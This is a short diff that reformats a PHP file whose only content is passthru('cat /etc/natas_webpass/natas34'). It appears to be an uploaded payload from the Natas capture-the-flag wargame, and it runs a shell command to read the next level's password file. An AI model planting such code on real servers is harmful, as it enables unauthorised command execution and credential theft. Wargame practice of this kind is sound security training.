@@ -1,3 +1,1 @@
-<?php
-	passthru('cat /etc/natas_webpass/natas34');
-?>
+<?php passthru('cat /etc/natas_webpass/natas34'); ?>
